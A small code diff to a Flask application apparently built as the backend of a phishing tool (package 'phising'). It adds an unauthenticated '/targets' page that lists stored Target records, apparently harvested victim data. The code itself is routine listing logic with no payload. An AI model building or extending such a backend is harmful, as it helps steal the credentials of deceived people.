@@ -4,7 +4,7 @@ from flask_login import login_required, current_user, logout_user, login_user
 
 from phising import app, db
 from .forms import AddUserForm, LoginUserForm
-from .models import User
+from .models import User, Target
 
 # Blueprint for backend
 backend = Blueprint('backend', __name__)
@@ -65,6 +65,7 @@ def allowed_users():
     users = User.query.all()
     return render_template('backend/allowed_users.html', users = users)
 
+
 # Delete User
 @backend.route('/delete/<int:id>', methods = ['POST'])
 def delete_user(id):
@@ -73,3 +74,10 @@ def delete_user(id):
     db.session.commit()
     flash(f"User: {user_delete.alias} removed", "success")
     return redirect(url_for('backend.allowed_users'))
+
+
+# Display content found
+@backend.route('/targets')
+def targets_found():
+    targets = Target.query.all()
+    return render_template('backend/targets.html', targets = targets)
